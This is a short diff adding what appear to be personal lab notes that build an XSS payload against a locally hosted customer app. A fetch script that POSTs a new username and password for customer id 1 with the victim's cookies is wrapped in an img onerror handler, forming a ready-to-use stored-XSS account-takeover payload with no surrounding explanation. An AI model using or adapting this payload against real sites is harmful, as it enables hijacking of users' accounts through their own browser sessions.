@@ -1,0 +1,20 @@
+# Script:
+
+const updateURL = 'http://localhost:8080/api/customer/update-customer';
+const formData = new FormData();
+formData.append('id', 1);
+formData.append('username', 'milos');
+formData.append('password', 'zivkovic');
+fetch(updateURL, {
+    method: 'POST',
+    body: formData,
+    credentials: 'include'
+});
+
+# IMG Element:
+
+<img src="x" onerror="">
+
+# Combined:
+
+<img src="x" onerror="const updateURL = 'http://localhost:8080/api/customer/update-customer'; const formData = new FormData(); formData.append('id', 1); formData.append('username', 'milos'); formData.append('password', 'zivkovic'); fetch(updateURL, {     method: 'POST',     body: formData,     credentials: 'include' });">
